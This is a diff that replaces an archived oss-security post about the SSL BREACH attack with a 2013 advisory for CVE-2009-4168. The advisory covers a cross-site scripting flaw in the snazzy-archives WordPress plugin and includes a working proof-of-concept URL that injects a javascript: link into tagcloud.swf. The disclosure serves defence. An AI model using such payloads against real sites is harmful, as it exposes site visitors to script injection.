@@ -1,40 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/15
-Message-ID: <52018D42.1090109@redhat.com>
-Date: Tue, 06 Aug 2013 17:56:50 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: Open Source Security <oss-security@...ts.openwall.com>, Assign a CVE Identifier <cve-assign@...re.org>, "Steven M. Christey" <coley@...re.org>
-Subject: SSL BREACH
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/10/3
+Message-ID: <20130310094737.GC5220@kludge.henri.nerv.fi>
+Date: Sun, 10 Mar 2013 11:47:37 +0200
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2009-4168: WordPress plugin snazzy-archives XSS vulnerability
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Plugin URL: http://wordpress.org/extend/plugins/snazzy-archives/
+Versions affected: 1.7.1 and below
+Reported to WordPress plugins team: 2013-02-03
+Status: Plugin currently disabled by WordPress plugins team. Not fixed by plugin maintainer.
 
-I assume this will get handled like CVE-2009-3555?
+PoC: wp-content/plugins/snazzy-archives/i/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href=%27javascript:alert%28%22oss-security%20is%20great!%22%29%27+style=%27font-size:+40pt%27%3Efree%20pr0n%3C/a%3E%3C/tags%3E
 
-http://threatpost.com/breach-compression-attack-steals-https-secrets-in-under-30-seconds/101579
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.6.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.5.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.3/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.4/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.6.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.5.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.4.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.4/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.5.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.2.3/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.5.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.0/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.7.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.5/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.3.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.2.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.6.3/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.5/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.7.0/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.3.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.0.1/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/1.2.2/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/tags/0.6/i/tagcloud.swf
+faa1b18d043ab7653e0f79d44450b802d2b6627e  ./snazzy-archives/trunk/i/tagcloud.swf
 
-http://it.slashdot.org/story/13/08/05/233216
+--
+Henri Salo
 
-https://www.djangoproject.com/weblog/2013/aug/06/breach-and-django/
-
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.13 (GNU/Linux)
-
-iQIcBAEBAgAGBQJSAY1CAAoJEBYNRVNeJnmTgBcP/jUKKNmUDTe28yQ8aDBCCyXR
-rcdyyudy6/Q5Q50E99fmU5LL0UWB1WKqrao7bn1Fwu8q/i3VyOLenbmyYeBeAL98
-zQBeqz+alSMcYYw4mpDiaY66KDFUiRM16dOw4wtHarL7kRyM3yte91H4J2fCFk3j
-BOBkC8D+hu9ZXF2OShp9gzWw0+5fwJ94wvJj6hw8fnRbmPWF4PJ7EtGEDVrvFOaJ
-rSDHuG+fZ0BXkgrVXNhh57Agu4EVJSj8l6UA0ltK9tH8PJXQoYJAh9qOGPSdPjeN
-y0J432RgjihyiHQARY++te4Sc3+joqXLwnPHXk7ww9r+mkxEcdzR6fhfo1Lo8bpr
-4VUiQ37BR/tck9JJZvWwclByqBk6Y9FHWblzMKiymdLzAthR1jTFNCHXuIBL1MBt
-sARu5TMbBww9RuAxvdDw0Dir6OLOBMWdpYXqqkh4b9lqyGIWmQbe2HX4VkJf2A4r
-a8wCD+/jmdXV2/7uz+csAO9OTexBpAE5s2EKjukQ9pslbB0ubqMFUsdYCGncaVZ/
-7/oOw9L1Y7oEF2xrZHnpQ5AIftUiBRTrws6p8cmvLssO/qhhFxKegZoC4w2URNUY
-WD7mM23jKRGWhSdn/lMdu39cyjnMaXlKxyfyxcYyL0L+8Kyn++sTIixT4+th0p8x
-09eZ84zqe5u3KJLufFqC
-=VhC2
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
